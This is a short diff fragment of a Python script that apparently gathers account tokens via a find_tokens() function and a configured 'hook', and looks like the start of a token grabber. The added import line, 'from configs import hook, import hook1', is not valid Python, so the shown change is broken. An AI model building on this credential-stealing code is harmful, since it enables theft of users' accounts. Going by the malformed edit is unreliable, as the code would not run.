@@ -3,7 +3,7 @@
 # PD: u can improve this script with username, badges etc
 
 import os, re, requests, json
-from configs import hook
+from configs import hook, import hook1
 
 def find_tokens():
     tokens = []
